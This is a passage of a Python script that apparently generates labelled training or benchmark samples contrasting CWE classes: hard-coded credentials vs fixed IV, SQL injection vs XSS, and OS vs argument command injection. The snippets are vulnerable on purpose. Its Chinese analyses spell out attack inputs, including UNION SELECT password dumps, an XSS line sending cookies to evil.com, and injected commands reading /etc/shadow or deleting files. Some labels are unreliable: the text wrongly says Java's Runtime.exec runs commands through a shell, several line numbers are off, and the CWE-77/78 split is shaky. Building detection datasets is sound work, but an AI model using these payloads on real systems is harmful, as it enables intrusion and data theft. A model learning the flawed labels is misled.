    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(plaintext) + encryptor.finalize()
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 5: ENCRYPTION_KEY 硬编码为 b'ThisIsAHardcodedEncryptionKey32!'，直接写在源码中。\n"
        "2. line 9: algorithms.AES(ENCRYPTION_KEY) 使用硬编码密钥创建加密器。\n"
        "3. IV 是随机的（os.urandom），加密逻辑正确，但密钥硬编码。\n"
        "4. 源码泄露导致加密密钥泄露，攻击者可解密所有已加密数据。\n"
        "5. 归因为 CWE-798 而非 CWE-329：IV 是随机生成的（os.urandom(16)），无 IV 问题。核心问题是加密密钥硬编码在源码中。\n"
        "6. 结论：CWE-798 Use of Hard-coded Credentials，风险 High。",
        has_vuln=True, vuln_type="CWE-798 Use of Hard-coded Credentials", risk="High",
        source_marker="ENCRYPTION_KEY = b'ThisIs",
        source_desc="ENCRYPTION_KEY = b'ThisIsAHardcodedEncryptionKey32!' 硬编码加密密钥",
        sink_marker="algorithms.AES(ENCRYPTION_KEY)",
        sink_desc="algorithms.AES(ENCRYPTION_KEY) 使用硬编码密钥初始化加密",
        explanation="line 5 ENCRYPTION_KEY 硬编码 -> line 9 algorithms.AES(ENCRYPTION_KEY) 使用硬编码密钥 -> 源码泄露导致密钥泄露 -> 攻击者可解密所有数据。归因 CWE-798 而非 CWE-329：IV 是随机的 os.urandom(16) 无 IV 问题；核心问题是密钥硬编码",
        fix_marker="ENCRYPTION_KEY = b'ThisIs",
        fix_desc="从环境变量获取: ENCRYPTION_KEY = os.environ['ENCRYPTION_KEY'].encode()"))

    # --- Pair 5: Java (AES hardcoded IV vs hardcoded password) ---
    # CWE-329
    code = r'''import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class TokenEncryptor {
    private static final String IV_STR = "1234567890abcdef";

    public static String encrypt(String data, byte[] key) throws Exception {
        IvParameterSpec ivSpec = new IvParameterSpec(IV_STR.getBytes());
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        return Base64.getEncoder().encodeToString(cipher.doFinal(data.getBytes()));
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 7: IV_STR 硬编码为 '1234567890abcdef'，固定不变。\n"
        "2. line 10: new IvParameterSpec(IV_STR.getBytes()) 使用固定 IV。\n"
        "3. 固定 IV 导致相同明文产生相同密文，可被密文分析。\n"
        "4. 密钥通过参数传入（非硬编码），但 IV 固定导致加密语义安全性丧失。\n"
        "5. 归因为 CWE-329 而非 CWE-798：密钥通过参数传入非硬编码，核心问题是 IV 硬编码不随机。\n"
        "6. 结论：CWE-329 Not Using a Random IV，风险 Medium。",
        has_vuln=True, vuln_type="CWE-329 Not Using a Random IV", risk="Medium",
        source_marker='IV_STR = "1234567890',
        source_desc='IV_STR = "1234567890abcdef" 硬编码固定 IV 字符串',
        sink_marker="new IvParameterSpec(IV_STR.getBytes())",
        sink_desc="new IvParameterSpec(IV_STR.getBytes()) 使用固定 IV 初始化加密",
        explanation="line 7 IV_STR 硬编码 -> line 10 IvParameterSpec 使用固定 IV -> 相同明文产生相同密文 -> 可被密文分析。归因 CWE-329 而非 CWE-798：密钥通过参数传入非硬编码；核心问题是 IV 硬编码不随机",
        fix_marker='IV_STR = "1234567890',
        fix_desc="每次加密生成随机 IV: byte[] iv = new byte[16]; new SecureRandom().nextBytes(iv); new IvParameterSpec(iv)"))

    # CWE-798
    code = r'''import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class DbConfig {
    private static final String DB_PASSWORD = "Admin@2024!";

    public static Connection connect() throws SQLException {
        return DriverManager.getConnection(
            "jdbc:postgresql://db.internal:5432/prod", "admin", DB_PASSWORD);
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 6: DB_PASSWORD 硬编码为 'Admin@2024!'，直接写在源码中。\n"
        "2. line 9: DriverManager.getConnection 使用硬编码密码连接生产数据库。\n"
        "3. 源码泄露导致数据库管理员密码泄露，攻击者可直接访问生产数据库。\n"
        "4. 密码出现在 Git 版本历史中，即使后续修改也留有痕迹。\n"
        "5. 归因为 CWE-798 而非 CWE-329：本代码没有加密操作，不存在 IV 问题。核心问题是数据库密码硬编码。\n"
        "6. 结论：CWE-798 Use of Hard-coded Credentials，风险 High。",
        has_vuln=True, vuln_type="CWE-798 Use of Hard-coded Credentials", risk="High",
        source_marker='DB_PASSWORD = "Admin@',
        source_desc='DB_PASSWORD = "Admin@2024!" 硬编码数据库管理员密码',
        sink_marker="DriverManager.getConnection(",
        sink_desc="DriverManager.getConnection(url, 'admin', DB_PASSWORD) 使用硬编码密码连接数据库",
        explanation="line 6 DB_PASSWORD 硬编码 -> line 9 DriverManager.getConnection 使用硬编码密码 -> 源码泄露导致生产 DB 密码泄露 -> 攻击者可访问生产数据库。归因 CWE-798 而非 CWE-329：无加密操作无 IV 问题；核心问题是密码硬编码",
        fix_marker='DB_PASSWORD = "Admin@',
        fix_desc="从环境变量获取: String dbPass = System.getenv('DB_PASSWORD')，或使用 Vault/KMS 等密钥管理服务"))

    return S


# ===========================================================================
# Group 4: CWE-89 (SQL Injection) vs CWE-79 (XSS) — 8 条 (4 对)
# ===========================================================================
def gen_cwe89_vs_cwe79():
    S = []

    # --- Pair 1: Python (Flask SQL injection vs XSS) ---
    # CWE-89 SQL Injection
    code = r'''from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/api/greeting', methods=['GET'])
def greeting():
    name = request.args.get('name', 'Guest')
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    query = "SELECT message FROM greetings WHERE name = '" + name + "'"
    result = cursor.execute(query).fetchone()
    conn.close()
    return jsonify({'greeting': result[0] if result else 'Hello!'})
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: request.args.get('name') 获取用户可控参数。\n"
        "2. line 10: 将 name 字符串拼接进 SQL 查询语句。\n"
        "3. line 11: cursor.execute(query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' UNION SELECT password FROM users-- 可泄露密码。\n"
        "5. 归因为 CWE-89 而非 CWE-79：用户输入进入 SQL 查询语句（cursor.execute）而非 HTML 响应。返回的是 jsonify（JSON），不会执行 HTML。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="request.args.get('name'",
        source_desc="request.args.get('name') 用户可控参数",
        sink_marker="cursor.execute(query)",
        sink_desc="cursor.execute(query) 执行字符串拼接的 SQL 语句",
        explanation="line 7 request.args.get('name') -> line 10 拼接进 SQL -> line 11 cursor.execute 执行 -> 攻击者注入 ' UNION SELECT password--。归因 CWE-89 而非 CWE-79：用户输入进入 SQL 查询而非 HTML 响应；返回 jsonify 是 JSON 不是 HTML",
        fix_marker="cursor.execute(query)",
        fix_desc="使用参数化查询 cursor.execute('SELECT message FROM greetings WHERE name = ?', (name,))"))

    # CWE-79 XSS
    code = r'''from flask import Flask, request

app = Flask(__name__)

@app.route('/api/greeting', methods=['GET'])
def greeting():
    name = request.args.get('name', 'Guest')
    return f'<html><body><h1>Hello, {name}!</h1></body></html>'
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: request.args.get('name') 获取用户可控参数。\n"
        "2. line 8: 将 name 通过 f-string 直接嵌入 HTML 响应，未转义。\n"
        "3. 浏览器渲染时执行 name 中的 HTML/JavaScript 代码。\n"
        "4. 攻击者传入 <script>alert(document.cookie)</script> 可窃取用户 Cookie。\n"
        "5. 归因为 CWE-79 而非 CWE-89：用户输入进入 HTML 响应（f-string 返回 HTML）而非 SQL 查询。无数据库操作。\n"
        "6. 结论：CWE-79 Cross-site Scripting (XSS)，风险 High。",
        has_vuln=True, vuln_type="CWE-79 Cross-site Scripting (XSS)", risk="High",
        source_marker="request.args.get('name'",
        source_desc="request.args.get('name') 用户可控参数",
        sink_marker="return f'<html>",
        sink_desc="return f'<html>...{name}...</html>' 将用户输入直接嵌入 HTML 响应",
        explanation="line 7 request.args.get('name') -> line 8 f-string 嵌入 HTML -> 浏览器渲染执行 -> 攻击者注入 <script>alert(document.cookie)</script>。归因 CWE-79 而非 CWE-89：用户输入进入 HTML 响应而非 SQL 查询；无数据库操作",
        fix_marker="return f'<html>",
        fix_desc="使用 html.escape 转义: import html; return f'<html><body><h1>Hello, {html.escape(name)}!</h1></body></html>'"))

    # --- Pair 2: Java (Spring SQL injection vs XSS) ---
    # CWE-89 SQL Injection
    code = r'''import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.sql.*;

@RestController
@RequestMapping("/api/greeting")
public class GreetingController {

    @GetMapping
    public ResponseEntity<?> greeting(@RequestParam String name) {
        try {
            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/app", "root", "");
            Statement stmt = conn.createStatement();
            String sql = "SELECT message FROM greetings WHERE name = '" + name + "'";
            ResultSet rs = stmt.executeQuery(sql);
            rs.next();
            return ResponseEntity.ok(rs.getString("message"));
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error");
        }
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 11: name 来自 @RequestParam，用户可控。\n"
        "2. line 16: 将 name 拼接进 SQL 查询语句。\n"
        "3. line 17: stmt.executeQuery(sql) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' UNION SELECT password FROM users-- 可泄露密码。\n"
        "5. 归因为 CWE-89 而非 CWE-79：用户输入进入 SQL 查询（Statement.executeQuery）而非 HTML 响应。返回 ResponseEntity.ok 是数据值。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="@RequestParam String name",
        source_desc="greeting(@RequestParam String name) 的 name 来自请求参数",
        sink_marker="stmt.executeQuery(sql)",
        sink_desc="stmt.executeQuery(sql) 执行字符串拼接的 SQL 语句",
        explanation="line 11 name -> line 16 拼接进 SQL -> line 17 stmt.executeQuery 执行 -> 攻击者注入 ' UNION SELECT password--。归因 CWE-89 而非 CWE-79：用户输入进入 SQL 查询而非 HTML 响应；返回的是数据值不是 HTML",
        fix_marker="stmt.executeQuery(sql)",
        fix_desc="使用 PreparedStatement: pstmt = conn.prepareStatement('SELECT message FROM greetings WHERE name = ?'); pstmt.setString(1, name)"))

    # CWE-79 XSS
    code = r'''import org.springframework.web.bind.annotation.*;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;

@RestController
@RequestMapping("/api/greeting")
public class GreetingController {

    @GetMapping(produces = MediaType.TEXT_HTML_VALUE)
    public ResponseEntity<String> greeting(@RequestParam String name) {
        String html = "<html><body><h1>Hello, " + name + "!</h1></body></html>";
        return ResponseEntity.ok().contentType(MediaType.TEXT_HTML).body(html);
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 11: name 来自 @RequestParam，用户可控。\n"
        "2. line 12: 将 name 字符串拼接进 HTML 内容。\n"
        "3. line 13: 返回 Content-Type: text/html 的响应，浏览器渲染时执行 name 中的脚本。\n"
        "4. 攻击者传入 <script>document.location='http://evil.com?c='+document.cookie</script> 可窃取 Cookie。\n"
        "5. 归因为 CWE-79 而非 CWE-89：用户输入进入 HTML 响应而非 SQL 查询。无数据库操作，Content-Type 为 text/html。\n"
        "6. 结论：CWE-79 Cross-site Scripting (XSS)，风险 High。",
        has_vuln=True, vuln_type="CWE-79 Cross-site Scripting (XSS)", risk="High",
        source_marker="@RequestParam String name",
        source_desc="greeting(@RequestParam String name) 的 name 来自请求参数",
        sink_marker='String html = "<html>',
        sink_desc='String html = "<html>... " + name + " ..." 将用户输入拼接进 HTML',
        explanation="line 11 name -> line 12 拼接进 HTML -> line 13 返回 text/html -> 浏览器渲染执行 -> 攻击者注入 <script> 窃取 Cookie。归因 CWE-79 而非 CWE-89：用户输入进入 HTML 响应而非 SQL 查询；无数据库操作",
        fix_marker='String html = "<html>',
        fix_desc="使用 HTML 转义: String safeName = org.apache.commons.text.StringEscapeUtils.escapeHtml4(name); html = '<html>...' + safeName + '...'"))

    # --- Pair 3: PHP (SQL injection vs XSS) ---
    # CWE-89 SQL Injection
    code = r'''<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '');
$name = $_GET['name'] ?? 'Guest';
$query = "SELECT message FROM greetings WHERE name = '" . $name . "'";
$stmt = $pdo->query($query);
$row = $stmt->fetch(PDO::FETCH_ASSOC);
echo json_encode(['greeting' => $row['message'] ?? 'Hello!']);
?>
'''
    S.append(_spec("php", code,
        "分析过程：\n"
        "1. line 3: $_GET['name'] 直接来自用户请求参数。\n"
        "2. line 4: 将 $name 拼接进 SQL 查询语句。\n"
        "3. line 5: $pdo->query($query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' OR '1'='1' UNION SELECT password FROM users-- 可泄露密码。\n"
        "5. 归因为 CWE-89 而非 CWE-79：用户输入进入 SQL 查询（$pdo->query）而非 HTML 输出。返回 json_encode 是 JSON。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="$_GET['name']",
        source_desc="$_GET['name'] 用户可控参数",
        sink_marker="$pdo->query($query)",
        sink_desc="$pdo->query($query) 执行字符串拼接的 SQL 语句",
        explanation="line 3 $_GET['name'] -> line 4 拼接进 SQL -> line 5 $pdo->query 执行 -> 攻击者注入 ' UNION SELECT password--。归因 CWE-89 而非 CWE-79：用户输入进入 SQL 查询而非 HTML 输出；返回 json_encode 是 JSON",
        fix_marker="$pdo->query($query)",
        fix_desc="使用预处理语句: $stmt = $pdo->prepare('SELECT message FROM greetings WHERE name = ?'); $stmt->execute([$name])"))

    # CWE-79 XSS
    code = r'''<?php
$name = $_GET['name'] ?? 'Guest';
echo "<html><body><h1>Hello, " . $name . "!</h1></body></html>";
?>
'''
    S.append(_spec("php", code,
        "分析过程：\n"
        "1. line 2: $_GET['name'] 直接来自用户请求参数。\n"
        "2. line 3: 将 $name 拼接进 HTML 输出，未转义。\n"
        "3. line 3: echo 输出 HTML，默认 Content-Type 为 text/html，浏览器渲染执行 name 中的脚本。\n"
        "4. 攻击者传入 <script>alert(document.cookie)</script> 可窃取用户 Cookie。\n"
        "5. 归因为 CWE-79 而非 CWE-89：用户输入进入 HTML 输出（echo）而非 SQL 查询。无数据库操作。\n"
        "6. 结论：CWE-79 Cross-site Scripting (XSS)，风险 High。",
        has_vuln=True, vuln_type="CWE-79 Cross-site Scripting (XSS)", risk="High",
        source_marker="$_GET['name']",
        source_desc="$_GET['name'] 用户可控参数",
        sink_marker='echo "<html>',
        sink_desc='echo "<html>..." . $name . "..." 将用户输入拼接进 HTML 输出',
        explanation="line 2 $_GET['name'] -> line 3 拼接进 HTML -> echo 输出 text/html -> 浏览器渲染执行 -> 攻击者注入 <script>alert(document.cookie)</script>。归因 CWE-79 而非 CWE-89：用户输入进入 HTML 输出而非 SQL 查询；无数据库操作",
        fix_marker='echo "<html>',
        fix_desc="使用 htmlspecialchars 转义: echo '<html><body><h1>Hello, ' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '!</h1></body></html>'"))

    # --- Pair 4: JavaScript (Express SQL injection vs XSS) ---
    # CWE-89 SQL Injection
    code = r'''const express = require('express');
const mysql = require('mysql2');
const app = express();
app.use(express.json());

const pool = mysql.createPool({host: 'localhost', user: 'root', database: 'app'});

app.get('/api/greeting', (req, res) => {
    const name = req.query.name;
    const query = "SELECT message FROM greetings WHERE name = '" + name + "'";
    pool.query(query, (err, results) => {
        if (err) return res.status(500).json({error: 'DB error'});
        res.json({greeting: results[0]?.message || 'Hello!'});
    });
});
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 9: req.query.name 获取用户可控参数。\n"
        "2. line 10: 将 name 字符串拼接进 SQL 查询语句。\n"
        "3. line 11: pool.query(query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' UNION SELECT password FROM users-- 可泄露密码。\n"
        "5. 归因为 CWE-89 而非 CWE-79：用户输入进入 SQL 查询（pool.query）而非 HTML 响应。返回 res.json 是 JSON。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="req.query.name",
        source_desc="req.query.name 用户可控参数",
        sink_marker="pool.query(query",
        sink_desc="pool.query(query) 执行字符串拼接的 SQL 语句",
        explanation="line 9 req.query.name -> line 10 拼接进 SQL -> line 11 pool.query 执行 -> 攻击者注入 ' UNION SELECT password--。归因 CWE-89 而非 CWE-79：用户输入进入 SQL 查询而非 HTML 响应；返回 res.json 是 JSON",
        fix_marker="pool.query(query",
        fix_desc="使用参数化查询 pool.query('SELECT message FROM greetings WHERE name = ?', [name], callback)"))

    # CWE-79 XSS
    code = r'''const express = require('express');
const app = express();

app.get('/api/greeting', (req, res) => {
    const name = req.query.name || 'Guest';
    const html = '<html><body><h1>Hello, ' + name + '!</h1></body></html>';
    res.set('Content-Type', 'text/html');
    res.send(html);
});
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 4: req.query.name 获取用户可控参数。\n"
        "2. line 5: 将 name 字符串拼接进 HTML 内容。\n"
        "3. line 7: res.send 返回 Content-Type: text/html 的响应，浏览器渲染执行 name 中的脚本。\n"
        "4. 攻击者传入 <img src=x onerror=alert(document.cookie)> 可窃取用户 Cookie。\n"
        "5. 归因为 CWE-79 而非 CWE-89：用户输入进入 HTML 响应（res.send HTML）而非 SQL 查询。无数据库操作。\n"
        "6. 结论：CWE-79 Cross-site Scripting (XSS)，风险 High。",
        has_vuln=True, vuln_type="CWE-79 Cross-site Scripting (XSS)", risk="High",
        source_marker="req.query.name",
        source_desc="req.query.name 用户可控参数",
        sink_marker="res.send(html)",
        sink_desc="res.send(html) 返回 Content-Type: text/html 的 HTML 响应",
        explanation="line 4 req.query.name -> line 5 拼接进 HTML -> line 7 res.send 返回 text/html -> 浏览器渲染执行 -> 攻击者注入 <img src=x onerror=alert(document.cookie)>。归因 CWE-79 而非 CWE-89：用户输入进入 HTML 响应而非 SQL 查询；无数据库操作",
        fix_marker="res.send(html)",
        fix_desc="转义 HTML: const escape = require('escape-html'); const html = '<html><body><h1>Hello, ' + escape(name) + '!</h1></body></html>'"))

    return S


# ===========================================================================
# Group 5: CWE-78 (OS Command Injection) vs CWE-77 (Command Injection) — 8 条 (4 对)
# ===========================================================================
def gen_cwe78_vs_cwe77():
    S = []

    # --- Pair 1: Python ---
    # CWE-78 OS Command Injection — os.system with user input
    code = r'''import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/ping', methods=['GET'])
def ping_host():
    target = request.args.get('target', '')
    result = os.system(f'ping -c 4 {target}')
    return jsonify({'result': result})
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: request.args.get('target') 获取用户可控参数。\n"
        "2. line 8: 将 target 通过 f-string 拼接进 shell 命令，os.system 直接通过 shell 执行。\n"
        "3. os.system 调用 /bin/sh -c 执行完整命令字符串，target 中的 shell 元字符 (; | &&) 会被解释。\n"
        "4. 攻击者传入 ; cat /etc/passwd 可读取系统文件，传入 ; rm -rf /tmp 可删除文件。\n"
        "5. 归因为 CWE-78 而非 CWE-77：用户输入直接进入 os.system（通过 shell=True 语义执行），sink 是 OS 命令执行本身，而非命令参数注入。\n"
        "6. 结论：CWE-78 OS Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-78 OS Command Injection", risk="Critical",
        source_marker="request.args.get('target'",
        source_desc="request.args.get('target') 用户可控目标主机",
        sink_marker="os.system(f'ping",
        sink_desc="os.system(f'ping -c 4 {target}') 通过 shell 执行拼接的命令",
        explanation="line 7 request.args.get('target') -> line 8 f-string 拼接进 shell 命令 -> os.system 执行 -> 攻击者注入 ; cat /etc/passwd 执行任意命令。归因 CWE-78 而非 CWE-77：sink 是 os.system 直接通过 shell 执行完整命令字符串",
        fix_marker="os.system(f'ping",
        fix_desc="使用 subprocess 列表参数 shell=False: subprocess.run(['ping', '-c', '4', target], capture_output=True)，并校验 target 为合法域名/IP"))

    # CWE-77 Command Injection — sh -c with user input as argument
    code = r'''import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/grep', methods=['GET'])
def grep_log():
    pattern = request.args.get('pattern', '')
    cmd = ['sh', '-c', f"grep '{pattern}' /var/log/app.log"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return jsonify({'result': result.stdout})
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: request.args.get('pattern') 获取用户可控参数。\n"
        "2. line 8: 将 pattern 通过 f-string 拼接进 sh -c 的命令字符串参数。\n"
        "3. 虽然使用了 subprocess.run 列表参数（shell=False 默认），但命令本身是 sh -c 且用户输入被拼入 sh -c 的参数字符串。\n"
        "4. 攻击者传入 ' /etc/passwd; cat /etc/shadow; echo ' 可执行任意命令（单引号闭合后注入）。\n"
        "5. 归因为 CWE-77 而非 CWE-78：注入点在 sh -c 的命令参数（pattern 是 grep 的参数），而非直接进入 os.system。命令本身是固定的 grep，但通过 sh -c 拼接导致参数注入。\n"
        "6. 结论：CWE-77 Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-77 Command Injection", risk="Critical",
        source_marker="request.args.get('pattern'",
        source_desc="request.args.get('pattern') 用户可控搜索模式",
        sink_marker="subprocess.run(cmd",
        sink_desc="subprocess.run(['sh', '-c', f\"grep '{pattern}' ...\"]) 通过 sh -c 执行拼接的命令",
        explanation="line 7 request.args.get('pattern') -> line 8 拼接进 sh -c 参数 -> line 9 subprocess.run 执行 -> 攻击者注入 ' /etc/passwd; cat /etc/shadow; echo '。归因 CWE-77 而非 CWE-78：注入点在 sh -c 的命令参数（grep 的 pattern），而非直接进入 os.system",
        fix_marker="subprocess.run(cmd",
        fix_desc="避免 sh -c 拼接，直接用列表参数: subprocess.run(['grep', pattern, '/var/log/app.log'], capture_output=True, text=True)"))

    # --- Pair 2: Java ---
    # CWE-78 OS Command Injection — Runtime.exec with user input
    code = r'''import java.io.*;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;

@RestController
@RequestMapping("/api")
public class PingController {

    @GetMapping("/ping")
    public ResponseEntity<?> ping(@RequestParam String target) {
        try {
            Process p = Runtime.getRuntime().exec("ping -c 4 " + target);
            String out = new String(p.getInputStream().readAllBytes());
            return ResponseEntity.ok(out);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error");
        }
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 11: target 来自 @RequestParam，用户可控。\n"
        "2. line 14: 将 target 拼接进命令字符串，Runtime.exec 通过 shell 执行。\n"
        "3. Runtime.exec(String) 会解析命令字符串中的 shell 元字符。\n"
        "4. 攻击者传入 ; cat /etc/passwd 可读取系统文件。\n"
        "5. 归因为 CWE-78 而非 CWE-77：用户输入直接进入 Runtime.exec 的命令字符串，sink 是 OS 命令执行本身，而非命令参数注入。\n"
        "6. 结论：CWE-78 OS Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-78 OS Command Injection", risk="Critical",
        source_marker="@RequestParam String target",
        source_desc="ping(@RequestParam String target) 的 target 来自请求参数",
        sink_marker="Runtime.getRuntime().exec(",
        sink_desc="Runtime.getRuntime().exec('ping -c 4 ' + target) 执行拼接的命令字符串",
        explanation="line 11 target -> line 14 拼接进 Runtime.exec 命令字符串 -> 执行 -> 攻击者注入 ; cat /etc/passwd 执行任意命令。归因 CWE-78 而非 CWE-77：sink 是 Runtime.exec 直接执行完整命令字符串",
        fix_marker="Runtime.getRuntime().exec(",
        fix_desc="使用 ProcessBuilder 列表参数: new ProcessBuilder('ping', '-c', '4', target).start()，并校验 target 格式"))

    # CWE-77 Command Injection — ProcessBuilder with sh -c
    code = r'''import java.io.*;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;

@RestController
@RequestMapping("/api")
public class GrepController {

    @GetMapping("/grep")
    public ResponseEntity<?> grep(@RequestParam String pattern) {
        try {
            ProcessBuilder pb = new ProcessBuilder(
                "sh", "-c", "grep '" + pattern + "' /var/log/app.log");
            Process p = pb.start();
            String out = new String(p.getInputStream().readAllBytes());
            return ResponseEntity.ok(out);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error");
        }
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 11: pattern 来自 @RequestParam，用户可控。\n"
        "2. line 15: 将 pattern 拼接进 sh -c 的命令字符串参数。\n"
        "3. 虽然使用了 ProcessBuilder（比 Runtime.exec 更安全），但命令是 sh -c 且用户输入被拼入其参数。\n"
        "4. 攻击者传入 ' /etc/passwd; cat /etc/shadow; echo ' 可执行任意命令（单引号闭合后注入）。\n"
        "5. 归因为 CWE-77 而非 CWE-78：注入点在 sh -c 的命令参数（pattern 是 grep 的参数），而非直接进入 Runtime.exec。命令本身是固定的 grep，但通过 sh -c 拼接导致参数注入。\n"
        "6. 结论：CWE-77 Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-77 Command Injection", risk="Critical",
        source_marker="@RequestParam String pattern",
        source_desc="grep(@RequestParam String pattern) 的 pattern 来自请求参数",
        sink_marker="pb.start()",
        sink_desc="ProcessBuilder('sh', '-c', \"grep '\" + pattern + \"' ...\").start() 通过 sh -c 执行拼接命令",
        explanation="line 11 pattern -> line 15 拼接进 sh -c 参数 -> pb.start() 执行 -> 攻击者注入 ' /etc/passwd; cat /etc/shadow; echo '。归因 CWE-77 而非 CWE-78：注入点在 sh -c 的命令参数（grep pattern），而非直接进入 Runtime.exec",
        fix_marker="pb.start()",
        fix_desc="避免 sh -c 拼接，直接用 ProcessBuilder 列表: new ProcessBuilder('grep', pattern, '/var/log/app.log').start()"))

    # --- Pair 3: Go ---
    # CWE-78 OS Command Injection — exec.Command sh -c with user input as command
    code = r'''package main

import (
    "fmt"
    "net/http"
    "os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
    cmd := r.URL.Query().Get("cmd")
    out, err := exec.Command("sh", "-c", cmd).Output()
    if err != nil {
        http.Error(w, "error", 500)
        return
    }
    fmt.Fprintf(w, "%s", out)
}

func main() {
    http.HandleFunc("/api/exec", handler)
    http.ListenAndServe(":8080", nil)
}
'''
    S.append(_spec("go", code,
        "分析过程：\n"
        "1. line 11: r.URL.Query().Get('cmd') 获取用户可控参数。\n"
        "2. line 12: exec.Command('sh', '-c', cmd) 将用户输入直接作为 sh -c 的完整命令执行。\n"
        "3. sh -c 接受任意命令字符串，cmd 完全由用户控制。\n"
        "4. 攻击者传入 rm -rf /tmp 或 cat /etc/passwd 可执行任意命令。\n"
        "5. 归因为 CWE-78 而非 CWE-77：用户输入 IS 整个命令（cmd 直接作为 sh -c 的命令参数），而非命令的某个参数。sink 是 OS 命令执行本身。\n"
        "6. 结论：CWE-78 OS Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-78 OS Command Injection", risk="Critical",
        source_marker='Query().Get("cmd")',
        source_desc="r.URL.Query().Get('cmd') 用户可控完整命令",
        sink_marker='exec.Command("sh", "-c", cmd)',
        sink_desc='exec.Command("sh", "-c", cmd) 将用户输入直接作为 sh -c 命令执行',
        explanation="line 11 Query().Get('cmd') -> line 12 exec.Command('sh', '-c', cmd) 直接执行用户输入作为命令 -> 攻击者执行 rm -rf /tmp 或 cat /etc/passwd。归因 CWE-78 而非 CWE-77：用户输入 IS 整个命令而非命令参数",
        fix_marker='exec.Command("sh", "-c", cmd)',
        fix_desc="使用固定命令和列表参数: exec.Command('ls', '-la', validatedPath)，禁止将用户输入作为完整命令"))

    # CWE-77 Command Injection — exec.Command sh -c with user input as argument
    code = r'''package main

import (
    "fmt"
    "net/http"
    "os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
    pattern := r.URL.Query().Get("pattern")
    cmd := exec.Command("sh", "-c", "grep '"+pattern+"' /var/log/app.log")
    out, err := cmd.Output()
    if err != nil {
        http.Error(w, "error", 500)
        return
    }
    fmt.Fprintf(w, "%s", out)
}

func main() {
    http.HandleFunc("/api/grep", handler)
    http.ListenAndServe(":8080", nil)
}
'''
    S.append(_spec("go", code,
        "分析过程：\n"
        "1. line 11: r.URL.Query().Get('pattern') 获取用户可控参数。\n"
        "2. line 12: 将 pattern 拼接进 sh -c 的命令字符串参数（grep 的参数）。\n"
        "3. 命令本身是固定的 grep，但 pattern 通过 sh -c 传递，单引号可被闭合。\n"
        "4. 攻击者传入 ' /etc/passwd; cat /etc/shadow; echo ' 可执行任意命令。\n"
        "5. 归因为 CWE-77 而非 CWE-78：注入点在命令参数（pattern 是 grep 的搜索模式），而非命令本身。命令固定为 grep，但通过 sh -c 拼接导致参数注入。\n"
        "6. 结论：CWE-77 Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-77 Command Injection", risk="Critical",
        source_marker='Query().Get("pattern")',
        source_desc="r.URL.Query().Get('pattern') 用户可控搜索模式",
        sink_marker="cmd.Output()",
        sink_desc="exec.Command(\"sh\", \"-c\", \"grep '\" + pattern + \"' /var/log/app.log\").Output() 通过 sh -c 执行拼接命令",
        explanation="line 11 Query().Get('pattern') -> line 12 拼接进 sh -c 命令参数 -> cmd.Output() 执行 -> 攻击者注入 ' /etc/passwd; cat /etc/shadow; echo '。归因 CWE-77 而非 CWE-78：注入点在命令参数（grep pattern）而非命令本身",
        fix_marker='cmd.Output()',
